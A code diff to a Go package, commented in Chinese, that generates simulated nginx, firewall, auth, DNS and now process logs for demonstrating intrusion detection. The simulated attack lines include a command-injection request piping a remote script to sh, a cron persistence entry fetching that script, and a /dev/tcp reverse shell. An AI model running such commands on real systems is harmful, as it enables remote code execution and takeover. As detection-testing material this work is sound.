@@ -1,4 +1,4 @@
-// Package demo 生成用于演示与测试的模拟日志（nginx + UFW + FortiGate + Linux auth.log + Zeek DNS）。
+// Package demo 生成用于演示与测试的模拟日志（nginx + UFW + FortiGate + Linux auth.log + Zeek DNS + 服务器进程日志）。
 // 所有 IP 均为随机生成的公网地址，日志内容仅用于本地演示检测效果。
 package demo
 
@@ -14,8 +14,8 @@ import (
 )
 
 type writer struct {
-	nginx, ufw, forti, auth, dns *bufio.Writer
-	files                        []*os.File
+	nginx, ufw, forti, auth, dns, proc *bufio.Writer
+	files                              []*os.File
 }
 
 func open(dir string, appendMode bool) (*writer, error) {
@@ -27,7 +27,7 @@ func open(dir string, appendMode bool) (*writer, error) {
 		flag = os.O_CREATE | os.O_WRONLY | os.O_APPEND
 	}
 	w := &writer{}
-	for _, name := range []string{"access.log", "ufw.log", "fortigate.log", "auth.log", "dns.log"} {
+	for _, name := range []string{"access.log", "ufw.log", "fortigate.log", "auth.log", "dns.log", "process.log"} {
 		f, err := os.OpenFile(filepath.Join(dir, name), flag, 0o644)
 		if err != nil {
 			w.close()
@@ -36,12 +36,12 @@ func open(dir string, appendMode bool) (*writer, error) {
 		w.files = append(w.files, f)
 	}
 	w.nginx, w.ufw, w.forti = bufio.NewWriter(w.files[0]), bufio.NewWriter(w.files[1]), bufio.NewWriter(w.files[2])
-	w.auth, w.dns = bufio.NewWriter(w.files[3]), bufio.NewWriter(w.files[4])
+	w.auth, w.dns, w.proc = bufio.NewWriter(w.files[3]), bufio.NewWriter(w.files[4]), bufio.NewWriter(w.files[5])
 	return w, nil
 }
 
 func (w *writer) flush() {
-	for _, b := range []*bufio.Writer{w.nginx, w.ufw, w.forti, w.auth, w.dns} {
+	for _, b := range []*bufio.Writer{w.nginx, w.ufw, w.forti, w.auth, w.dns, w.proc} {
 		if b != nil {
 			b.Flush()
 		}
@@ -174,10 +174,16 @@ func (s *Sim) intrusion(w *writer, t time.Time, step int) {
 		web("GET", "/api/ping?host=127.0.0.1;id", 400, 96)
 	case 6:
 		web("GET", "/api/ping?host=127.0.0.1;curl%20-s%20http://"+payloadHost+"/s.sh%7Csh", 200, 4821)
+		// 服务器上 PHP-FPM（www-data）执行了注入的命令：主机进程日志里的直接证据
+		fmt.Fprintln(w.proc, s.procLine(t.Add(2*time.Second), "/usr/bin/sh", "sh -c ping -c 1 127.0.0.1;curl -s http://"+payloadHost+"/s.sh|sh", "/usr/sbin/php-fpm8.2", "www-data"))
 	case 8, 13, 18, 23, 28:
 		fmt.Fprintln(w.forti, s.fortiOutLine(t.Add(time.Duration(10+step)*time.Second), s.server, payloadHost, 443, false))
+		if step == 13 { // 写入 cron 定时拉取载荷（持久化）
+			fmt.Fprintln(w.proc, s.procLine(t.Add(5*time.Second), "/usr/bin/sh", "sh -c (crontab -l; echo '*/5 * * * * curl -s http://"+payloadHost+"/s.sh|sh') | crontab -", "/usr/bin/bash", "www-data"))
+		}
 	case 9:
 		fmt.Fprintln(w.forti, s.fortiOutLine(t.Add(20*time.Second), s.server, a.ip, 4444, false))
+		fmt.Fprintln(w.proc, s.procLine(t.Add(19*time.Second), "/usr/bin/bash", "bash -c bash -i >& /dev/tcp/"+a.ip+"/4444 0>&1", "/usr/bin/sh", "www-data"))
 	case 20:
 		for i := 20; i < 45; i++ {
 			fmt.Fprintln(w.forti, s.fortiLanLine(s.sec(t), s.server, fmt.Sprintf("10.0.0.%d", i), 445))
